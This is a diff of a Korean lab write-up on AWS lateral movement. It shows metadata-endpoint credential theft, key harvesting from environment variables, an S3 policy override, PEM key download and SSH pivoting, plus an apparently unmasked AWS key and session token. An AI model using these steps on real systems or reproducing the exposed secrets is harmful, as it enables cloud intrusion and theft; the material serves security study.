@@ -1,199 +1,148 @@
-> ⚠️ 주의  
-> 이 문서는 보안 학습 및 승인된 테스트 환경에서의 실습 내용을 정리한 기록이다.  
+> ⚠️ 주의
+> 이 문서는 보안 학습 및 승인된 테스트 환경에서의 실습 내용을 정리한 기록이다.
 > 실제 시스템에 대한 무단 접근이나 권한 남용을 목적으로 작성된 것이 아니다.
+> 
+> 캐피탈 원(Capital One) AWS 개인정보 유출 사고 (2019) 사례를 바탕으로 실습하였다.
+# 🛡️ AWS Cloud Lateral Movement 과정 정리
 
-# 🛡️ AWS S3 기반 자격 증명 탈취 및 Lateral Movement 과정 정리
-
-이미 웹쉘을 통해 장악한 WAS 서버에서  
-IAM Role 및 AWS 자격 증명을 활용하여
-
-- S3 버킷 접근
-- 백업 파일 탐색
-- PEM 키 탈취
-- 내부 EC2 서버 접근
-
-까지 이어지는 **Cloud Lateral Movement 공격 흐름**을 정리한 실습 기록이다.
+이미 장악한 WAS 서버의 자격 증명을 활용하여
+내부망에 존재하는 다른 EC2 인스턴스까지 침투 범위를 넓히는
+**Cloud Lateral Movement 과정**을 정리한 실습 기록이다.
 
 ---
 
 ## 실습 환경
 
-    10.0.23.181   (최종 타겟 EC2 내부 IP)
-
----
-
-## 1. AWS 인프라 정보 수집 (Reconnaissance)
-
-### IAM Role 확인
-
-    curl http://169.254.169.254/latest/meta-data/iam/security-credentials
-
-### IAM Role 기반 자격 증명 탈취
-
-    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Discovery-Role
-
-장악한 WAS 서버에 부여된 IAM Role 정보를 통해  
-임시 자격 증명(Access Key, Secret Key, Session Token)을 확보한다.
-
----
-
-## 2. 공격자 환경에 AWS 자격 증명 설정
-
-    unset AWS_SESSION_TOKEN
-    unset AWS_ACCESS_KEY_ID
-    unset AWS_SECRET_ACCESS_KEY
-
-    export AWS_ACCESS_KEY_ID="ASIA***************"
-    export AWS_SECRET_ACCESS_KEY="************************"
-    export AWS_SESSION_TOKEN="************************"
-    export AWS_DEFAULT_REGION="ap-northeast-2"
-
----
-
-### 버킷 확인 및 다운로드 시도 실패
-    aws s3 ls
-    aws s3 ls s3://book-village/backup/ --recursive
-![img_8.png](img_8.png)
+```bash
+172.31.15.107 (장악한 WAS 서버 내부 IP)
+10.0.23.181   (최종 타겟 EC2 내부 IP)
 ```
+
+---
+
+## 1. 인프라 정보 수집 (Reconnaissance)
+
+내 IAM Role 권한 확인
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+
+위 명령어로 조회된 IAM Role (EC2-Discovery-Role) 로 key 및 token 탈취
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Discovery-Role
+```
+
+장악한 WAS 서버에 부여된 **IAM Role (EC2-Discovery-Role)** 권한을 활용하여
+현재 AWS 계정 내 EC2 인스턴스 목록과 IP 주소를 조회한다.
+
+```bash
+proxychains4 aws ec2 describe-instances --region ap-northeast-2 \
+--query 'Reservations[*].Instances[*].{InstanceId:InstanceId,PrivateIpAddress:PrivateIpAddress,PublicIpAddress:PublicIpAddress,State:State.Name}' \
+--output table
+```
+![img.png](img/AWS서버침투/img.png)
+### 분석 결과
+
+타겟 인스턴스의 내부 IP **10.0.23.181**을 확보하였다.
+
+---
+
+## 2. 자격 증명 탈취 (Credential Harvesting)
+
+서버 내부 환경 변수를 확인하여
+Role 기반 임시 키가 아닌 **IAM User 영구 자격 증명(Long-term Key)**을 확보한다.
+
+```bash
+env
+```
+
+### 확인된 정보 예시
+![img_1.png](img/AWS서버침투/img_1.png)
+### 확인된 정보 예시
+
+---
+
+## 3. 공격자 권한 승격 및 환경 설정
+
+탈취한 IAM 키를 현재 세션에 등록하여
+기존 Role 권한보다 넓은 권한을 사용하도록 설정한다.
+
+```bash
+# 1. 기존에 꼬여있을 수 있는 임시 토큰 정보를 완전히 제거.
+unset AWS_SESSION_TOKEN
+unset AWS_ACCESS_KEY_ID
+unset AWS_SECRET_ACCESS_KEY
+
+# 2. 새로 얻은 '영구 키'를 서버 환경 변수에 주입.
+export AWS_ACCESS_KEY_ID="AKIA***************"
+export AWS_SECRET_ACCESS_KEY="IZ5FIc**************************"
+export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGYaDmFwLW5vcnRoZWFzdC0yIkcwRQIgao8kp1dGld0Q6NXjqR8VQOp2A7eAHJa/VvCewPTguXACIQC4F0g36GIkte7Xkscc6fUnyc3xsT1Npi9uXx8abxtY/irLBQgvEAAaDDg1ODUwNzExMzg4OSIMPYKxfvbE5azZFidHKqgFjlHG9RdaplHupsgX2Uf3ajQMN0OeuMaoLcEjWknSZ3FpDsfFQIIqhU8XlHO5eQ9h6Ccg5OJWR4PrJqFR4OMEG3vHKdh2zOif+2AK/udjnWpSSa6g/1h3/hhOqo3gsjS3tzmVCm2pc0NgdQmHhyOF+JvU5Z18BLICOToPJKfMELLvcjXS9VDgsP6mtSR94hPiCunGzdFWESa9pFJqnz+r/rsiqvy81THJwlwGDwO9MPmoPf0nbrIJyU4UCigX1SpfNK5MUJyivjEzX3b6ZClPYkrd5RWJrK+5MNFibzhsyw3BZNMSEG2hcwy/fiVFtPyHaF9FGOhxshXMHlHynBBpbXLjhBru4O1qe5eowYMi8eTCaykk+CUDOjd5xa4ix4YhkTLLpeJlEsBCumguzXUNF+HqzaXybCDDUQDi5V9DA9b2GghQGkydK3NVuYlWHjEI0TK+zUQ6as/31Ts44QFe83fyN41iIMHJyxoMmLhdwLrZxUChad1ESnz1+NWzoxdabT7qeul0X7F4+4yaDtxnysWtyB4Db6eA9la2sDtkrDIDxBf/OmkMD1I1uEK+vp+cWu5jckXLVNhVd8Xc1bNyimZAGt2xLTax5jpdYQ7L5TUW8TBDJiK6c30kq9BoSDKtGedxKX5ZMufKzEiBNijlsofqbyGB7TnIq9EzDc23OEOnFTQTeYQvnNAl9oT+zn4PXnNyIMOsEVqRdZx49b7/ycMx6+kihkkoh5gMNf6InYkBAanMt2DHd8lA0ETuufh4uaKTOv9VjmbyWNbWopzCZsWXrnGk4pIVtZ/TDKjkHcovbqSat1zEyAM4ZhDbyRseApJqb6PkOMfGZ8VfkAkB+H5w4/WhZvVu7twOEFg3LUDKXyZmDcM31LUIUK6PSf+IPTD5A1NB5XYwvcTzzQY6sQFaFHigIySZ3oBhvMUrNm6VWBE9Q0SsJ64Px3PC0SwvpF66lV49cKN7pE+CLBLoMh3Cr5sKiO3pqGmSe3jrbDn9ecRza9BYgaYdyXdKNf3fM7wYJqlE2Z2fgAkAHL4RJXeF9L2muMxtoTNEgVdF+KNye5QW0XTN3LZq0EFxbojIq4KnsOyBNvfEzWEYAwcUb5lPa3Hil4IfGOfSfugRwKoutqd2aLWN7CoTjJzfEOpB4gE="
+export AWS_DEFAULT_REGION="ap-northeast-2"
+```
+export AWS_ACCESS_KEY_ID="ASIA4PYYC6WQWJEV3NEE"
+export AWS_SECRET_ACCESS_KEY="DLHdsDorYoB0rvCSzgEr5VrjAT+UdswBVwJwBM4l"
+export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGYaDmFwLW5vcnRoZWFzdC0yIkcwRQIgao8kp1dGld0Q6NXjqR8VQOp2A7eAHJa/VvCewPTguXACIQC4F0g36GIkte7Xkscc6fUnyc3xsT1Npi9uXx8abxtY/irLBQgvEAAaDDg1ODUwNzExMzg4OSIMPYKxfvbE5azZFidHKqgFjlHG9RdaplHupsgX2Uf3ajQMN0OeuMaoLcEjWknSZ3FpDsfFQIIqhU8XlHO5eQ9h6Ccg5OJWR4PrJqFR4OMEG3vHKdh2zOif+2AK/udjnWpSSa6g/1h3/hhOqo3gsjS3tzmVCm2pc0NgdQmHhyOF+JvU5Z18BLICOToPJKfMELLvcjXS9VDgsP6mtSR94hPiCunGzdFWESa9pFJqnz+r/rsiqvy81THJwlwGDwO9MPmoPf0nbrIJyU4UCigX1SpfNK5MUJyivjEzX3b6ZClPYkrd5RWJrK+5MNFibzhsyw3BZNMSEG2hcwy/fiVFtPyHaF9FGOhxshXMHlHynBBpbXLjhBru4O1qe5eowYMi8eTCaykk+CUDOjd5xa4ix4YhkTLLpeJlEsBCumguzXUNF+HqzaXybCDDUQDi5V9DA9b2GghQGkydK3NVuYlWHjEI0TK+zUQ6as/31Ts44QFe83fyN41iIMHJyxoMmLhdwLrZxUChad1ESnz1+NWzoxdabT7qeul0X7F4+4yaDtxnysWtyB4Db6eA9la2sDtkrDIDxBf/OmkMD1I1uEK+vp+cWu5jckXLVNhVd8Xc1bNyimZAGt2xLTax5jpdYQ7L5TUW8TBDJiK6c30kq9BoSDKtGedxKX5ZMufKzEiBNijlsofqbyGB7TnIq9EzDc23OEOnFTQTeYQvnNAl9oT+zn4PXnNyIMOsEVqRdZx49b7/ycMx6+kihkkoh5gMNf6InYkBAanMt2DHd8lA0ETuufh4uaKTOv9VjmbyWNbWopzCZsWXrnGk4pIVtZ/TDKjkHcovbqSat1zEyAM4ZhDbyRseApJqb6PkOMfGZ8VfkAkB+H5w4/WhZvVu7twOEFg3LUDKXyZmDcM31LUIUK6PSf+IPTD5A1NB5XYwvcTzzQY6sQFaFHigIySZ3oBhvMUrNm6VWBE9Q0SsJ64Px3PC0SwvpF66lV49cKN7pE+CLBLoMh3Cr5sKiO3pqGmSe3jrbDn9ecRza9BYgaYdyXdKNf3fM7wYJqlE2Z2fgAkAHL4RJXeF9L2muMxtoTNEgVdF+KNye5QW0XTN3LZq0EFxbojIq4KnsOyBNvfEzWEYAwcUb5lPa3Hil4IfGOfSfugRwKoutqd2aLWN7CoTjJzfEOpB4gE="
+export AWS_DEFAULT_REGION="ap-northeast-2"
+
+### 권한 확인
+
+```bash
+aws sts get-caller-identity
+```
+![img_3.png](img/AWS서버침투/img_3.png)
+---
+
+## 4. S3 데이터 탐색
+
+승격된 권한을 이용해 S3 저장소에 접근하여
+백업 파일 및 서버 접속용 키 파일 공격 PC에 저장하여 권한 설정.
+
+```bash
+aws s3 ls
+aws s3 ls s3://book-village-s3/backup/ --recursive
 aws s3 cp s3://book-village-s3/backup/Book-Village.pem ./Book-Village.pem
+chmod 400 Book-Village.pem
 ```
-![img_9.png](img_9.png)
-## 3. IAM Role 권한 분석
-
-### 관리형 정책 확인
-
-    aws iam list-attached-role-policies --role-name EC2-Discovery-Role
-![img_2.png](img_2.png)
-### 인라인 정책 확인
-
-    aws iam list-role-policies --role-name EC2-Discovery-Role
-![img_3.png](img_3.png)
-### 인라인 정책 상세 조회
-
-    aws iam get-role-policy --role-name EC2-Discovery-Role --policy-name Book-Village
-![img_1.png](img_1.png)
-IAM Role이 S3 접근 및 정책 수정 권한을 보유하고 있는지 확인한다.
+![img_2.png](img/AWS서버침투/img_2.png)
 
 ---
 
-## 4. S3 버킷 정책 확인 및 우회
+## 5. 타겟 서버 접근 (Lateral Movement)
 
-### 버킷 정책 조회
+획득한 `.pem` 키와 was에서 획득한 퍼블릭IP를 이용하여 내부망에 위치한 EC2 서버에 SSH로 접속한다.
 
-    aws s3api get-bucket-policy --bucket book-village
-![img.png](img.png)
-backup 폴더에 대한 Deny 정책 존재 확인
+```bash
+proxychains4 ssh -i "Book-Village.pem" ubuntu@[퍼블릭IP]
+```
+![img_4.png](img/AWS서버침투/img_4.png)
+---
+
+## 6. 공격 흐름 요약
+
+```
+[Attacker]
+      │
+      ▼ (Reverse Shell)
+[WAS Server (172.31.15.107)]
+      │
+      │ IAM Key 확인
+      ▼
+[AWS Account]
+      │
+      ▼
+[S3 Bucket]
+      │
+      │ PEM Key 확보
+      ▼
+[Target EC2 (퍼블릭IP)]
+```
 
 ---
 
-### 정책 우회를 위한 JSON 생성
+## 7. 사용 기술 및 도구
 
-    nano unlock.json
-<details>
-<summary>unlock.json 코드 눌러서 펼치기</summary>
-    {
-        "Version": "2012-10-17",
-        "Statement": [
-            {
-                "Effect": "Allow",
-                "Principal": "*",
-                "Action": "s3:*",
-                "Resource": [
-                    "arn:aws:s3:::book-village",
-                    "arn:aws:s3:::book-village/*"
-                ]
-            },
-            {
-                "Effect": "Allow",
-                "Principal": "*",
-                "Action": "s3:*",
-                "Resource": "arn:aws:s3:::book-village/backup/*"
-            }
-        ]
-    }
-</details>
-![img_6.png](img_6.png)
----
-
-### 버킷 정책 덮어쓰기
-
-    aws s3api put-bucket-policy \
-    --bucket book-village \
-    --policy file://unlock.json
-
-기존 Deny 정책을 무력화하고 전체 접근 권한 확보
-
----
-
-## 5. S3 데이터 탐색 및 PEM 키 탈취
-
-### S3 파일 목록 확인
-
-    aws s3 ls s3://book-village/backup/
-
-### PEM 키 다운로드
-
-    aws s3 cp s3://book-village/backup/Book-Village.pem ./Book-Village.pem
-![img_7.png](img_7.png)
-### 권한 설정
-
-    chmod 400 Book-Village.pem
-
-EC2 접속용 Private Key 확보
-
----
-
-## 6. 타겟 EC2 서버 접근 (Lateral Movement)
-
-    ssh -i Book-Village.pem ubuntu@[퍼블릭IP]
-
-탈취한 키를 이용하여 내부망 EC2 서버 접근 성공
-
----
-
-## 7. 공격 흐름 요약
-
-    [Attacker]
-          │
-          ▼ (Webshell)
-    [WAS Server]
-          │
-          │ IAM Role / AWS Key 탈취
-          ▼
-    [AWS Account]
-          │
-          │ S3 Bucket 정책 변경
-          ▼
-    [S3 Bucket]
-          │
-          │ PEM Key 탈취
-          ▼
-    [Target EC2]
-
----
-
-## 8. 핵심 취약점 정리
-
-| 구분 | 취약점 |
-|------|--------|
-| 인증 | EC2 IAM Role 과도한 권한 |
-| 자격 증명 | 환경변수 내 AWS Key 노출 |
-| 접근제어 | S3 Bucket Policy 수정 가능 |
-| 데이터 보호 | PEM 키 S3에 평문 저장 |
-| 네트워크 | 내부망 EC2 직접 접근 가능 |
-
----
-
-## 9. 보안 관점 핵심 요약
-
-- Webshell + IAM Role = Cloud 전체 확장 가능
-- S3는 자격 증명 저장소로 악용될 수 있음
-- PEM 키 유출 시 내부 서버 직접 접근 가능
-
----
-
-## 🔥 결론
-
-서버 하나가 침해되면  
-IAM Role 및 S3를 통해  
-AWS 전체 인프라로 공격이 확장될 수 있다.
+| 구분 | 기술 / 도구 | 설명 |
+|-----|-------------|------|
+| 정보 수집 | AWS CLI | EC2 인스턴스 및 S3 자산 조회 |
+| 네트워크 | Proxychains4 | 내부망 접근을 위한 프록시 터널링 |
+| 자격 증명 | IAM Access Key | 영구 자격 증명을 이용한 권한 유지 |
+| 데이터 탐색 | S3 | 백업 폴더 내 키 파일 탐색 |
+| 최종 접근 | SSH | 키 페어 기반 원격 접속 |
